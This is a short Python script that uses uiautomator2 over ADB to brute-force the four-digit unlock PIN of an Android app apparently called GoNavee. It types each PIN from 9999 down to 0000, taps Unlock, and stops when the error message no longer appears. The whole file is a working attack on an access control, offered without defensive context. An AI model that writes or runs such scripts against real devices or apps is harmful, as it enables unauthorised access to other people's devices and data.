import uiautomator2 as u2
import time

# Connect to Android device via ADB
d = u2.connect()

# Enable Fast Input Mode for Faster Typing
d.set_fastinput_ime(True)

# Resource IDs from window_dump.xml
PIN_INPUT_ID = "com.MotorPedal.GoNavee:id/edit_pwd"
UNLOCK_BUTTON_ID = "com.MotorPedal.GoNavee:id/btn_unlock"
ERROR_MESSAGE_ID = "com.MotorPedal.GoNavee:id/tv_error"

def send_pin(pin):
    """Clears old PIN, enters a new one, and clicks Unlock."""
    d(resourceId=PIN_INPUT_ID).clear_text()  # Forcefully clear previous value
    d(resourceId=PIN_INPUT_ID).set_text(str(pin))  # Enter new PIN
    d(resourceId=UNLOCK_BUTTON_ID).click()  # Click Unlock

def is_unlocked():
    """Detects if Password Error disappears (PIN is correct)."""
    return not d(resourceId=ERROR_MESSAGE_ID).exists  # If no error message, PIN is correct

# 🚀 Fast Sequential Brute-Force (Starting from 9999)
for pin in range(9999, -1, -1):  # Start from 9999 and decrease to 0000
    pin_str = f"{pin:04d}"  # Format PIN (e.g., 9999 → 0000)
    print(f"🔄 Trying PIN: {pin_str}")

    send_pin(pin_str)  # Enter PIN & Click Unlock

    if is_unlocked():  # Stop if PIN is correct
        print(f"✅ SUCCESS! Correct PIN: {pin_str}")
        break  # Exit brute-force loop when successful
